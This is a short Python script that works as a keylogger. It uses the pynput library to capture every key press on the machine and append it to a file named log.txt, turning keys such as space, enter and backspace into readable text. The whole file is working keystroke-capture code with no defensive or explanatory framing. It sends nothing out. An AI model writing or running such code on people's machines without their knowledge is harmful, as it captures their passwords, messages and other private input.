from pynput.keyboard import Listener

# Define a function to write the pressed key to a file
def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    # Replace special keys with more readable representations
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ' '
    if letter == 'Key.enter':
        letter = '\n'
    if letter == 'Key.ctrl':
        letter = ' '
    if letter == 'Key.backspace':
        letter = ' BACKSPACE '

    # Open the log file in append mode and write the key
    with open("log.txt", 'a') as f:
        f.write(letter)

# Set up a listener that calls the write_to_file function on each key press
with Listener(on_press=write_to_file) as l:
    l.join()
